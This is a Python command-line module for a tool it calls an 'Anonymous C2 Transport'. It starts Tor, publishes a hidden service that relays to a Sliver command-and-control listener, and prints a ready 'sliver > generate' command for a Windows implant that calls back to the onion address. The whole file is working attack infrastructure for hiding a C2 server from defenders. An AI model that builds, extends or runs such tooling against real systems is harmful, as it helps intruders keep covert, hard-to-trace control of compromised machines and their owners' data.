import click
import signal
import sys
import os

from .tor_manager import TorManager
from .proxy import SliverProxy
from .config import load_config, BridgeConfig

_tor_manager = None
_running = False


def signal_handler(sig, frame):
    global _tor_manager, _running
    print("\n[*] Shutting down...")
    _running = False
    if _tor_manager:
        _tor_manager.stop_tor()
    sys.exit(0)


@click.group()
@click.version_option(version='1.0.0')
def cli():
    pass


@cli.command()
@click.option('--sliver-host', default='127.0.0.1', help='Sliver server host')
@click.option('--sliver-port', default=8443, type=int, help='Sliver HTTP listener port')
@click.option('--tor-port', default=9050, type=int, help='Tor SOCKS port')
@click.option('--ctrl-port', default=9051, type=int, help='Tor control port')
@click.option('--service-port', default=80, type=int, help='Hidden service port')
@click.option('--config', '-c', default=None, help='Config file path')
def start(sliver_host, sliver_port, tor_port, ctrl_port, service_port, config):
    global _tor_manager, _running
    
    if config:
        cfg = load_config(config)
        sliver_host = cfg.sliver.host
        sliver_port = cfg.sliver.port
        tor_port = cfg.tor.socks_port
        ctrl_port = cfg.tor.control_port
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    print("=" * 60)
    print("       SLIVER TOR BRIDGE - Anonymous C2 Transport")
    print("=" * 60)
    print()
    
    proxy_port = 8080
    
    _tor_manager = TorManager(
        hidden_service_dir='./sliver_hidden_service',
        tor_port=tor_port,
        ctrl_port=ctrl_port,
        service_port=service_port,
        target_port=proxy_port
    )
    
    try:
        _tor_manager.start_tor()
        onion = _tor_manager.get_onion_address()
        
        if not onion:
            print("[!] Failed to get onion address")
            return
        
        print()
        print("=" * 60)
        print(f"  [+] Bridge is READY!")
        print(f"  [+] Hidden Service: http://{onion}")
        print()
        print(f"  Generate Sliver implant with:")
        print(f"  sliver > generate --http http://{onion} --os windows --save /tmp/implant.exe")
        print("=" * 60)
        print()
        print("[*] Press Ctrl+C to stop")
        print()
        
        proxy = SliverProxy(sliver_host=sliver_host, sliver_port=sliver_port, listen_port=proxy_port)
        _running = True
        proxy.run()
        
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        if _tor_manager:
            _tor_manager.stop_tor()


@cli.command()
def status():
    hs_dir = './sliver_hidden_service'
    hostname_path = os.path.join(hs_dir, 'hostname')
    
    if os.path.exists(hostname_path):
        with open(hostname_path, 'r') as f:
            onion = f.read().strip()
        print(f"[+] Hidden Service: http://{onion}")
        print("[+] Status: Configured (may not be running)")
    else:
        print("[!] No hidden service configured")
        print("[*] Run 'sliver-tor-bridge start' to create one")


@cli.command()
def stop():
    import shutil
    hs_dir = './sliver_hidden_service'
    
    if os.path.exists(hs_dir):
        shutil.rmtree(hs_dir)
        print("[+] Hidden service directory removed")
    else:
        print("[*] Nothing to clean up")


@cli.command('generate-config')
@click.option('--output', '-o', default='config.yaml', help='Output file path')
def generate_config(output):
    config = BridgeConfig.default()
    config.save(output)
    print(f"[+] Configuration saved to: {output}")


if __name__ == '__main__':
    cli()
